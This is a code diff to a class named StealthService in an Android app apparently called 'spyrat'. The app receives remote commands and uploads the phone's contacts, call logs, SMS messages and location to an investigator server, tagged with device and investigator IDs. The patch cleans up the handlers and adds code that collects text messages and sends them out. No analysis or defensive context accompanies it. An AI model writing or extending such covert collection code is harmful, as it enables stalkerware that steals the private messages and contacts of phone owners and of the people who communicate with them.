@@ -1,0 +1,92 @@
+--- a/app/src/main/java/com/spyrat/investigation/StealthService.java
++++ b/app/src/main/java/com/spyrat/investigation/StealthService.java
+@@ -250,38 +250,7 @@
+     
+     private void handleGetContactsCommand(String commandId, JSONObject parameters) {
+         try {
+-            // REMOVED TEST DATA - Using only real contacts
+             JSONArray realContacts = contactsCollector.getContacts();
+-            
+-            // If no real contacts, return empty array instead of test data
+-            if (realContacts.length() == 0) {
+-                Log.w(TAG, "⚠️ No real contacts found - returning empty data");
+-            }
+-            
+             investigatorApiClient.sendContactsData(realContacts);
+             investigatorApiClient.sendCommandResponse(commandId, "completed", "Real contacts data sent: " + realContacts.length() + " contacts");
+         } catch (Exception e) {
+@@ -292,20 +261,7 @@
+     
+     private void handleGetCallLogsCommand(String commandId, JSONObject parameters) {
+         try {
+-            // REMOVED TEST DATA - Using only real call logs
+             JSONArray realCallLogs = callLogCollector.getCallLogs();
+-            
+-            // If no real call logs, return empty array instead of test data
+-            if (realCallLogs.length() == 0) {
+-                Log.w(TAG, "⚠️ No real call logs found - returning empty data");
+-            }
+-            
+-            investigatorApiClient.sendDataToInvestigator("call_logs", callLogsData);
+-            investigatorApiClient.sendCommandResponse(commandId, "completed", "Real call logs sent: " + realCallLogs.length() + " calls");
+-        } catch (Exception e) {
+-            investigatorApiClient.sendCommandResponse(commandId, "error", "Get real call logs failed: " + e.getMessage());
+-        }
+-    }
+-    
+-    private void handleGetRealSMSCommand(String commandId, JSONObject parameters) {
+-        try {
+             JSONObject callLogsData = new JSONObject();
+             callLogsData.put("call_logs", realCallLogs);
+             callLogsData.put("count", realCallLogs.length());
+@@ -313,6 +269,21 @@
+             callLogsData.put("investigator_code", investigatorCode);
+             callLogsData.put("timestamp", System.currentTimeMillis());
+             
++            investigatorApiClient.sendDataToInvestigator("call_logs", callLogsData);
++            investigatorApiClient.sendCommandResponse(commandId, "completed", "Real call logs sent: " + realCallLogs.length() + " calls");
++        } catch (Exception e) {
++            investigatorApiClient.sendCommandResponse(commandId, "error", "Get real call logs failed: " + e.getMessage());
++        }
++    }
++    
++    private void handleGetRealSMSCommand(String commandId, JSONObject parameters) {
++        try {
++            JSONArray realSMS = smsCollector.getSMSMessages();
++            JSONObject smsData = new JSONObject();
++            smsData.put("sms_messages", realSMS);
++            smsData.put("count", realSMS.length());
++            smsData.put("device_id", deviceId);
++            smsData.put("investigator_code", investigatorCode);
++            smsData.put("timestamp", System.currentTimeMillis());
++            
+             investigatorApiClient.sendDataToInvestigator("sms_data", smsData);
+             investigatorApiClient.sendCommandResponse(commandId, "completed", "Real SMS data sent: " + realSMS.length() + " messages");
+         } catch (Exception e) {
+@@ -325,20 +296,6 @@
+             
+             // Collect all data
+             JSONArray realContacts = contactsCollector.getContacts();
+-            
+-            // REMOVED TEST CONTACTS
+-            if (realContacts.length() == 0) {
+-                Log.w(TAG, "⚠️ No real contacts available");
+-            }
+-            
+             JSONArray realCallLogs = callLogCollector.getCallLogs();
+-            
+-            // REMOVED TEST CALL LOGS
+-            if (realCallLogs.length() == 0) {
+-                Log.w(TAG, "⚠️ No real call logs available");
+-            }
+-            
+             JSONArray realSMS = smsCollector.getSMSMessages();
+-            
+-            // REMOVED TEST SMS
+-            if (realSMS.length() == 0) {
+-                Log.w(TAG, "⚠️ No real SMS available");
+-            }
+-            
+             JSONObject realLocation = locationCollector.getCurrentLocation();
+             
+             // Create comprehensive data package
